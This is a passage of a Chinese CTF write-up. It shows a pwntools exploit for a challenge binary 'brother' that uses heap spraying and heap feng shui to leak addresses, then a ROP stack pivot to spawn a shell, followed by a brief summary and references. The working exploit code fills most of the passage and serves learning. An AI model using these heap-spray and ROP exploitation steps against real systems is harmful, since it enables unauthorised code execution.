    def POW():
        context.log_level = 'debug'
        p.recvuntil('sha256(XXXX + ')
        end = p.recvuntil(') == ')[ : -5]
        hs = p.recvline()[ : -1]
        p.recvuntil(' : ')
        s = string.letters+string.digits
        for t1 in s:
            for t2 in s:
                for t3 in s:
                    for t4 in s:
                        if sha256(t1 + t2 + t3 + t4 + end).hexdigest() == hs:
                            p.sendline(t1 + t2 + t3 + t4)
                            context.log_level = 'info'
                            return
        exit(0)
    '''
    def malloc(sz, data):
        p.recvuntil('>>> ')
        p.sendline('1')
        p.recvuntil(': ')
        p.sendline(str(sz))
        for buf, te in data:
            p.recvuntil(': ')
            p.sendline(buf)
            p.recvuntil(': ')
            p.sendline(str(te))
    def show(s_idx, e_idx):
        p.recvuntil('>>> ')
        p.sendline('2')
        p.recvuntil(': ')
        p.sendline(str(s_idx))
        p.recvuntil(': ')
        p.sendline(str(e_idx))
    def delete():
        p.recvuntil('>>> ')
        p.sendline('3')
    def modify(idx, buf):
        p.recvuntil('>>> ')
        p.sendline('4')
        p.recvuntil(': ')
        p.sendline(str(idx))
        p.recvuntil(': ')
        p.sendline(buf)
    def callfuc(idx):
        p.recvuntil('>>> ')
        p.sendline('5')
        p.recvuntil(': ')
        p.sendline(str(idx))
    def GameStart(ip, port, debug):
        global p
        if debug == 1:
            p = process('./brother')
        elif debug == 2:
            p = process('./brother',env={'LD_PRELOAD':'./libc-2.23.so'})
        else:
            p = remote(ip, port)
        #POW()
        data = []
        for i in range(0x10):
            data.append(['X' * (0x20000 - 1), 1])
        malloc(0x20000, data)
        delete()
        #malloc 0x100 0x20000 chunks
        for i in range(0x10):
            malloc(0x20000, data)
        data = []
        for i in range(0x10):
            data.append(['X' * (0x1000 - 1), 1])
        malloc(0x1000, data)
        delete()
        data = []
        for i in range(0x10):
            data.append(['X' * (0xf0 - 1), 0])
        malloc(0xf0, data)
        #every malloc 0x10 chunk
        #set 0x58585858 = 0x58585857
        callfuc(0x100)
        show(0, 0x100)
        index = 0
        offest = 0
        out = ''
        for i in range(0x100):
            out = p.recvline()
            if 'W' in out:
                index = i
                break
        out = out[12 : ]
        offest = out.index('W')
        log.info('0x58585858 is : %d' % index)
        log.info('offest is : %d' % offest)
        log.info('start addr is : ' + hex(0x58585858 - offest))
        block_start = (index / 0x10) * 0x10
        log.info('block start is : ' + hex(block_start))
        magic_addr = 0x58585858
        #0x100-0x110 free
        delete()
        count = 1
        p_index = 0
        while 1:
            log.info("start find prev block count = %d" % count)
            data = []
            for i in range(0x10):
                data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),
        1])
            malloc(0x1000, data)
            delete()
            data = []
            for i in range(0x10):
                data.append(['X' * (0xa0 - 1), 0])
            malloc(0xa0, data)
            log.info("start call fuc count = %d" % count)
            callfuc(0x100)
            show(block_start - 0x10, index + 1)
            p_index = 0
            out = ''
            for i in range(index + 1 - block_start + 0x10):
                out = p.recvline()
                if 'W' in out:
                    out = out[12 : ]
                    print "find again! " + str(out.index('W'))
                    p_index = i + block_start - 0x10
                    break
            delete()
            #find last of th
            if p_index < block_start:
                break
            count += 1
        log.info('block start is : %d' % block_start)
        log.info('p_index is : %d' % p_index)
        heap_start_addr = magic_addr - 0x20008 * (count - 1 +0x10 * (block_start / 0x10)) - offest - 8
        log.info('heap start is : ' + hex(heap_start_addr))
        for i in range(0x10):
            delete()
        data = []
        for i in range(0x10):
            data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])
        malloc(0x1000, data)
        delete()
        data = []
        for i in range(0x10):
            data.append(['aaa', 0])
        malloc(0xa0, data)
        callfuc(0)
        show(0, 0x10)
        for i in range(index + 1 - block_start + 0x10):
            out = p.recvline()
            out = out[12 : -1]
            if 'aaa' != out:
                libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0
                break
        log.info('libc addr is : ' + hex(libc_addr))
        delete()
        magic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword
        magic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;
        system_offest = 0x3a940
        binsh_addr = 0x15902b
        data = []
        for i in range(0x10):
            data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])
        malloc(0x1000, data)
        delete()
        data = []
        for i in range(0x10):
            data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr
        + magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +
        p32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\x00'), 0])
        malloc(0xa0, data)
        gdb.attach(p)
        callfuc(0)
        p.interactive()
    GameStart('10.112.100.47', 9999, 2)
### 总结
这道题实际上并没有用到标准的堆喷获取控制流的技术，但是在解题过程中应用到了这种`堆喷`的思维来`bypass
PIE`。我们通过分配大量内存以及堆风水来达到控制程序反馈信息进而获得地址的目的，这种宏观意义上对于堆分配的利用同传统`glib
pwn`上考察几个堆块之间分配释放利用技巧不同，更注重大家对于全局的思考，是一道非常精妙的二进制题目。这里再次感谢`w1tcher`师傅赛后提供的writeup和exp，以及`p4nda`师傅对我的帮助。
## 参考
[演示Heap
Spray(堆喷射)的原理](https://blog.csdn.net/lixiangminghate/article/details/53413863)
[Linux内核通用堆喷射技术详解](https://xz.aliyun.com/t/2814)
[Microsoft-virtual-address-spaces](https://docs.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/virtual-address-spaces)